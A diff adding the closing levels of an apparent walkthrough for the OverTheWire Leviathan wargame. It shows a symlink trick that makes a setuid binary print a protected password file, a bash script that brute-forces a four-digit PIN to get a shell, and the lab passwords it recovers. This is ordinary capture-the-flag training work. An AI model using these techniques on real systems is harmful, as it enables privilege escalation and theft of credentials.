@@ -330,3 +330,101 @@ Running it prints the following output.
 
 Passing it through a binary to ascii converter gives us the password to the next level - `Tith4cokei`.
 
+# Level 5
+
+Running the same routine we find.
+
+```
+total 28
+drwxr-xr-x  2 root       root       4096 Oct 29  2018 .
+drwxr-xr-x 10 root       root       4096 Oct 29  2018 ..
+-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5 7560 Oct 29  2018 leviathan5
+-rw-r--r--  1 root       root        675 May 15  2017 .profile
+```
+
+And running `./leviathan5` yields.
+
+```
+Cannot find /tmp/file.log
+```
+
+Maybe we can do another symbolic link!
+
+We run `ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log` to create it 
+and afterwards we run the executable.
+
+```
+leviathan5@leviathan:~$ ./leviathan5 
+UgaoFee4li
+```
+
+Easy peasy, lemon squeezy.
+
+# Level 6
+
+In Level 6 we have a PIN protected executable, given we need a 4 digit-code we can brute force it!
+
+Using the power of `bash` we brew a script, dead simple, yet powerfull!
+
+```bash
+#!/bin/bash
+
+for a in {0..9}
+do
+  for b in {0..9}
+  do
+    for c in {0..9}
+    do
+      for d in {0..9}
+      do
+        echo "$a$b$c$d"
+        ~/leviathan6 "$a$b$c$d"
+      done
+    done
+  done
+done
+```
+
+This will brute force the password and print the codes while doing it!
+
+We do the following and wait.
+
+```
+chmod a+x script.sh
+./script
+```
+
+It will stop when the right password was reached, after a long list of numbers and wrongs.
+
+```
+Wrong
+7120
+Wrong
+7121
+Wrong
+7122
+Wrong
+7123
+$ whoami
+leviathan7
+```
+
+Voilá!
+
+Now we just `cat` the password, when we exit the shell the script will continue running,
+there is no point to it, so you can just `Ctrl-C` to kill it.
+
+```
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+
+# Level 7
+
+You did it!
+
+If you enjoyed reading this walkthrough, have comments or fixes on it,
+send me a <a class="icon" target="_blank" href="https://twitter.com/jmg_duarte">
+<i class="fab fa-twitter"></i></a>.
